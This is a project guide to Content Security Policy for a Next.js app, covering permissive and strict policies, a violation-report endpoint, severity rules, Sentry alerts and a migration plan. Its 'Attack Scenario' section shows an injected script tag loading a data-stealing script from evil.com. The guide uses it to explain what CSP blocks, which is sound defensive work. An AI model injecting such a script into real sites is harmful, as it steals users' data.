# 🛡️ Content Security Policy (CSP) - Complete Guide

**Last Updated**: November 5, 2025  
**Status**: ✅ Implemented (Report-Only Mode)

---

## 📖 Table of Contents

1. [What is CSP?](#what-is-csp)
2. [Why You Need It](#why-you-need-it)
3. [Current Implementation](#current-implementation)
4. [Development vs Production](#development-vs-production)
5. [Monitoring & Reporting](#monitoring--reporting)
6. [Migration to Strict Mode](#migration-to-strict-mode)
7. [Troubleshooting](#troubleshooting)
8. [Best Practices](#best-practices)

---

## What is CSP?

**Content Security Policy (CSP)** is a security header that tells browsers which resources are safe to load, preventing:
- ❌ Cross-Site Scripting (XSS) attacks
- ❌ Code injection attacks
- ❌ Malicious script execution
- ❌ Data exfiltration
- ❌ Clickjacking

Think of CSP as a **whitelist** for your website's resources.

### How It Works

```
Browser loads your page
   ↓
Receives CSP header from server
   ↓
Tries to load a resource (script, style, image, etc.)
   ↓
Checks: "Is this allowed by CSP?"
   ├─ ✅ YES → Load it
   └─ ❌ NO  → Block it + Send violation report
```

---

## Why You Need It

### Attack Scenario Without CSP

An attacker injects this into your website:

```html
<script src="https://evil.com/steal-data.js"></script>
```

**Without CSP**: ❌ Script runs, steals user data, sends to attacker  
**With CSP**: ✅ Script blocked, violation reported, user protected

### Real-World Impact

| Attack Type | Without CSP | With CSP |
|-------------|-------------|----------|
| **Inline Script Injection** | ❌ Executes | ✅ Blocked |
| **External Malicious Scripts** | ❌ Loads | ✅ Blocked |
| **eval() Code Injection** | ❌ Runs | ✅ Blocked |
| **Unauthorized iframes** | ❌ Loads | ✅ Blocked |
| **Data Exfiltration** | ❌ Succeeds | ✅ Prevented |

---

## Current Implementation

### File Location

**Middleware**: `src/middleware.ts`  
**Report Endpoint**: `src/app/api/csp-report/route.ts`

### CSP Policies

#### Active Policy (Permissive - Allows Everything)

```typescript
const cspDirectives = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://vercel.live https://*.google.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com data:",
  "img-src 'self' data: https: blob:",
  "connect-src 'self' https://*.firebaseio.com https://*.googleapis.com",
  "frame-src 'self' https://*.google.com",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests"
];
```

**Purpose**: Keep app working while testing strict policy

#### Report-Only Policy (Strict - Monitors Violations)

```typescript
const cspDirectivesStrict = [
  "default-src 'self'",
  "script-src 'self' https://vercel.live https://*.google.com",  // ✅ No unsafe-inline/eval
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com", // Keep for Next.js
  "font-src 'self' https://fonts.gstatic.com data:",
  "img-src 'self' data: https: blob:",
  "connect-src 'self' https://*.firebaseio.com https://*.googleapis.com https://*.upstash.io",
  "frame-src 'self' https://*.google.com",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests",
  "report-uri /api/csp-report"  // ✅ Sends violations here
];
```

**Purpose**: Monitor what would break with strict policy

The report endpoint rate-limits by IP, reads reports through a 32KB bounded text body, requires an exact object-shaped legacy `csp-report` envelope, and uses presence/length metadata plus stable directive/URI categories for production security events. Syntactically valid primitive, array, or malformed envelope values return a bounded `400` instead of reaching failure logging. The route logs malformed JSON envelopes as capped `csp_report_json_parse_failed` diagnostics before returning the same non-blocking 204 response. Unexpected processing failures use bounded security diagnostics (`csp_report_processing_failed`) instead of raw route exceptions or full request URLs.

All external `http:` or `https:` script violations are high severity. Severity does not trust host-name substrings supplied by the report, so an unrelated host containing a vendor word cannot downgrade the signal.

### Why Two Policies?

```
Active Policy (Permissive)
  → Keeps your app working normally
  → Users don't experience any blocking

Report-Only Policy (Strict)
  → Detects violations in the background
  → Reports what would be blocked
  → Zero user impact

After 24-48 hours of monitoring:
  → If no critical violations → Switch to strict
  → App stays working, security improved!
```

---

## Development vs Production

### Development Mode

**CSP Logging**: ❌ **DISABLED**

**Why?**
- Next.js uses `eval()` for Hot Module Reloading
- Every page load = 100+ CSP violations
- All are expected and safe in development
- Console becomes unreadable

**Console Output**:
```bash
# Before (Noisy):
🚨 SECURITY [HIGH] CSP Violation { blockedUri: 'eval' }
🚨 SECURITY [HIGH] CSP Violation { blockedUri: 'eval' }
🚨 SECURITY [HIGH] CSP Violation { blockedUri: 'eval' }
[... 97 more times ...]

# After (Clean):
 POST /api/csp-report 204 in 12ms
 POST /api/csp-report 204 in 11ms
```

**Implementation**:
```typescript
// src/app/api/csp-report/route.ts

const isDev = process.env.NODE_ENV === 'development';

// Only log in production
if (!isDev) {
  const severity = determineCSPSeverity(violation);
  logger.security("CSP Violation Detected", getCspViolationLogContext(violation), severity);
}

// Always return 204 (endpoint works in both modes)
return new Response(null, { status: 204 });
```

**Sentry Impact**: ✅ Protected (no quota waste on dev violations)

---

### Production Mode

**CSP Logging**: ✅ **ENABLED**

All violations are:
- ✅ Logged to Sentry
- ✅ Sent to configured alerts
- ✅ Visible in dashboard

**Expected Violations**:
- 0-10 per day (real security issues)
- Mostly from third-party integrations

**Behavior**:
```typescript
if (!isDev) {
  // Determine severity based on violation type
  const severity = determineCSPSeverity(violation);
  
  // Send bounded report metadata to Sentry
  logger.security("CSP Violation Detected", getCspViolationLogContext(violation), severity);
}
```

---

## Monitoring & Reporting

### Automatic Reporting

**The browser does all the work!**

```
1. User visits your site
   ↓
2. Browser receives CSP headers
   ↓
3. Page loads resources
   ↓
4. Browser detects CSP violation
   ↓
5. Browser AUTOMATICALLY sends POST to /api/csp-report
   ↓
6. Your endpoint processes and logs it
   ↓
7. You get notified (Sentry/Email/Slack)
```

**You never trigger this manually!**

### Viewing Violations

#### Development (Terminal)

```bash
npm run dev

# Violations are accepted without production logging:
POST /api/csp-report 204 in 12ms
POST /api/csp-report 204 in 11ms
```

#### Production (Sentry)

**Dashboard Filter**: `type:security category:csp_violation`

**Example Event**:
```json
{
  "event": "CSP Violation Detected",
  "severity": "high",
  "context": {
    "blockedUriKind": "inline",
    "directiveCategory": "script-src",
    "blockedUriPresent": true,
    "blockedUriLength": 6,
    "violatedDirectivePresent": true,
    "violatedDirectiveLength": 15,
    "sourceFilePresent": true,
    "sourceFileLength": 29,
    "lineNumber": 42,
    "userAgentPresent": true,
    "userAgentLength": 111
  }
}
```

### Severity Levels

```typescript
function determineCSPSeverity(violation: any): 'low' | 'medium' | 'high' | 'critical' {
  const directive = violation['violated-directive'];
  const blockedUri = violation['blocked-uri'];
  
  // CRITICAL: eval() or inline scripts
  if (directive?.includes('script') && 
      (blockedUri === 'eval' || blockedUri === 'inline')) {
    return 'critical';
  }
  
  // HIGH: Unknown external scripts
  if (directive?.includes('script')) {
    return 'high';
  }
  
  // MEDIUM: Styles, images, fonts
  if (directive?.includes('style') || 
      directive?.includes('img') || 
      directive?.includes('font')) {
    return 'medium';
  }
  
  return 'low';
}
```

### Setting Up Alerts

#### Sentry Email Alerts

1. Go to Sentry → **Settings** → **Alerts**
2. Create rule:
   - **Name**: "CSP Violations"
   - **When**: `type:security AND category:csp_violation`
   - **Then**: Email to [your-email]
   - **Frequency**: Immediately

#### Slack Alerts

1. Sentry → **Settings** → **Integrations** → **Slack**
2. Connect workspace
3. Create alert rule:
   - **When**: `type:security severity:high OR severity:critical`
   - **Then**: Send to #security-alerts
   - **Frequency**: Immediately

**You'll get**:
```
🚨 Security Alert in production

CSP Violation Detected
━━━━━━━━━━━━━━━━━━━━━━━━
File: /dashboard
Directive: script-src-elem
Blocked: inline script

View in Sentry →
```

---

## Migration to Strict Mode

### The Safe Migration Path

**Phase 1: Monitoring (Current State) - 24-48 hours**
```
✅ Active Policy: Permissive (app works)
✅ Report-Only Policy: Strict (monitors violations)
→ Collect violation data
→ Identify patterns
→ Fix critical issues
```

**Phase 2: Analysis - 1 hour**
```
✅ Review all collected violations
✅ Categorize: Real issues vs false positives
✅ Whitelist necessary external scripts
✅ Fix inline scripts if needed
```

**Phase 3: Enforcement - 5 minutes**
```
✅ Switch Active Policy to Strict
✅ Remove Report-Only header
✅ Deploy
✅ Monitor for 24 hours
```

### Step-by-Step Migration

#### Step 1: Monitor Current Violations

```bash
# After 24-48 hours of production traffic
# Check Sentry dashboard

# Filter: type:security category:csp_violation
# Look for patterns:
#   - Same violation repeated many times?
#   - Unknown external scripts?
#   - Inline scripts from your code?
```

#### Step 2: Fix Violations

**Common Violation: Inline Analytics**

```html
<!-- ❌ BEFORE: Blocked by strict CSP -->
<script>
  gtag('config', 'G-XXXXXX');
</script>

<!-- ✅ AFTER: Move to external file -->
<!-- public/scripts/analytics.js -->
<script src="/scripts/analytics.js"></script>
```

**Common Violation: eval() Usage**

```javascript
// ❌ BEFORE: Blocked by strict CSP
const result = eval('2 + 2');

// ✅ AFTER: Refactor
const result = 2 + 2;
```

**Common Violation: Unknown External Script**

```typescript
// Check if legitimate (e.g., Google Analytics)
// If yes, add to whitelist:

"script-src 'self' https://www.googletagmanager.com https://vercel.live"
```

#### Step 3: Apply Strict Policy

```typescript
// src/middleware.ts

// Remove permissive Active policy
// Apply strict policy as Active

const cspDirectives = [
  "default-src 'self'",
  "script-src 'self' https://vercel.live https://*.google.com", // ✅ No unsafe
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com", // Keep for Next.js
  // ... rest of strict policy
];

response.headers.set('Content-Security-Policy', cspDirectives.join('; '));

// Remove Report-Only header (no longer needed)
// response.headers.delete('Content-Security-Policy-Report-Only');
```

#### Step 4: Deploy & Monitor

```bash
git add src/middleware.ts
git commit -m "Apply strict CSP policy"
git push

# Monitor Sentry for:
# - Sudden increase in violations
# - User reports of broken features
# - Console errors in production
```

### Expected Timeline

| Phase | Duration | Action |
|-------|----------|--------|
| **Monitor** | 24-48 hours | Collect violations |
| **Analyze** | 1-2 hours | Review and categorize |
| **Fix** | 2-4 hours | Refactor inline scripts |
| **Deploy Strict** | 5 minutes | Apply strict policy |
| **Verify** | 24 hours | Monitor for issues |
| **Total** | ~3-4 days | Safe migration complete |

---

## Troubleshooting

### "I don't see any violations"

✅ **Good!** Your app is clean.

**Verify CSP is working**:
```javascript
// In browser console
fetch(window.location.href).then(r => {
  console.log('Active CSP:', r.headers.get('content-security-policy'));
  console.log('Report-Only CSP:', r.headers.get('content-security-policy-report-only'));
});

// Both should return policy strings
```

**Trigger a test violation**:
```javascript
// In browser console
eval('console.log("test")');

// Check terminal/Sentry for violation report
```

---

### "Too many violations!"

**Common causes**:

1. **Browser Extensions** (AdBlock, etc.)
   - ✅ Normal, ignore these
   - Inspect local browser reports during development if a domain allowlist change is needed; production security events keep only URI kind and length metadata

2. **Third-Party Scripts** (Analytics, etc.)
   - ✅ Need whitelisting
   - Add legitimate domains to CSP

3. **Inline Next.js Styles**
   - ✅ Expected, safe to keep
   - `style-src 'unsafe-inline'` is necessary

**Filter noise**:
```typescript
// src/app/api/csp-report/route.ts

const bodyResult = await readBoundedTextBody(request, CSP_REPORT_MAX_BYTES, options);
const violation = parseCspReport(bodyResult.body);
const severity = determineCSPSeverity(violation);

// Log bounded metadata only
logger.security('CSP Violation Detected', getCspViolationLogContext(violation), severity);
```

---

### "Sentry not receiving violations"

**Checklist**:
- [ ] `ENABLE_SENTRY: true` in `src/config/features.ts`
- [ ] Valid Sentry DSN in environment
- [ ] App deployed (not just localhost)
- [ ] Production environment
- [ ] Sentry quota not exceeded

**Test**:
```bash
# Trigger test error
curl https://your-app.com/api/sentry-example-api

# Should appear in Sentry within 10 seconds
```

---

### "Feature broke after enabling strict CSP"

**Debug steps**:

1. **Check browser console** for CSP errors
2. **Identify blocked resource** (script, style, etc.)
3. **Determine if legitimate**:
   - Your code? → Fix inline script
   - Third-party? → Whitelist domain
   - Malicious? → Good, it's blocked!

4. **Temporarily revert to permissive**:
```typescript
// Emergency rollback
"script-src 'self' 'unsafe-inline' 'unsafe-eval' ..."
```

5. **Fix the issue properly**
6. **Re-deploy strict policy**

---

## Best Practices

### ✅ DO

1. **Start with Report-Only** - Monitor before enforcing
2. **Monitor for 24-48 hours** - Catch all edge cases
3. **Keep style 'unsafe-inline'** - Next.js requires it
4. **Whitelist known domains** - Google Fonts, Analytics, etc.
5. **Log all violations** - Track patterns
6. **Set up alerts** - Know when things break
7. **Document exceptions** - Why each domain is whitelisted
8. **Review regularly** - Remove unused whitelisted domains

### ❌ DON'T

1. **Enable strict CSP immediately** - Will break features
2. **Ignore violations** - May be real security issues
3. **Allow 'unsafe-eval'** - Major security risk
4. **Over-whitelist** - Be specific with domains
5. **Forget to test** - Check all critical paths
6. **Skip monitoring** - Always watch for issues
7. **Use inline scripts** - Move to external files
8. **Disable CSP in production** - Defeats the purpose

---

## Configuration Reference

### Full CSP Directive List

```typescript
const cspDirectives = [
  // Where resources can be loaded from
  "default-src 'self'",                           // Default for all directives
  
  // Scripts
  "script-src 'self' https://vercel.live https://*.google.com",
  
  // Styles
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  
  // Fonts
  "font-src 'self' https://fonts.gstatic.com data:",
  
  // Images
  "img-src 'self' data: https: blob:",
  
  // AJAX, WebSocket, EventSource
  "connect-src 'self' https://*.firebaseio.com https://*.googleapis.com wss://*.firebaseio.com https://*.upstash.io",
  
  // <iframe> sources
  "frame-src 'self' https://*.google.com",
  
  // <object>, <embed>, <applet>
  "object-src 'none'",
  
  // <base> tag
  "base-uri 'self'",
  
  // <form> action
  "form-action 'self'",
  
  // Who can embed this page in <iframe>
  "frame-ancestors 'none'",
  
  // Upgrade HTTP to HTTPS
  "upgrade-insecure-requests",
  
  // Where to send violation reports
  "report-uri /api/csp-report"
];
```

### Directive Keywords

- **'self'**: Same origin as the document
- **'none'**: Block all resources
- **'unsafe-inline'**: Allow inline scripts/styles (⚠️ dangerous)
- **'unsafe-eval'**: Allow eval() and similar (⚠️ dangerous)
- **data:**: Allow data: URIs
- **https:**: Allow any HTTPS URL
- **blob:**: Allow blob: URIs
- **wss:**: Allow WebSocket connections

---

## Security Impact

### Before CSP

```
XSS Protection: ❌ Minimal
Code Injection: ❌ Vulnerable
Malicious Scripts: ❌ Can execute
Data Exfiltration: ❌ Possible
Security Score: 30/100
```

### After CSP (Strict Mode)

```
XSS Protection: ✅ Strong
Code Injection: ✅ Blocked
Malicious Scripts: ✅ Prevented
Data Exfiltration: ✅ Mitigated
Security Score: 90/100
```

**Remaining 10%**: `style-src 'unsafe-inline'` (necessary for Next.js)

---

## Related Documentation

- **Monitoring Guide**: `../monitoring/complete-guide.md`
- **OWASP Implementation**: `../owasp/IMPLEMENTATION_STATUS.md`
- **Deployment Checklist**: `../../deployment/PRODUCTION_CHECKLIST.md`

---

## Summary

✅ **CSP is implemented and monitoring violations**
- Active Policy: Permissive (keeps app working)
- Report-Only Policy: Strict (monitors violations)
- Development: Silent logging (clean console)
- Production: Full Sentry integration
- Ready for strict mode migration

**Current Status**: Report-Only Mode  
**Next Step**: Monitor 24-48h → Switch to Strict  
**Security Impact**: High (prevents XSS, injection attacks)

---

**Last Reviewed**: November 5, 2025  
**Next Review**: December 5, 2025  
**Status**: ✅ Monitoring Active, Ready for Strict Mode
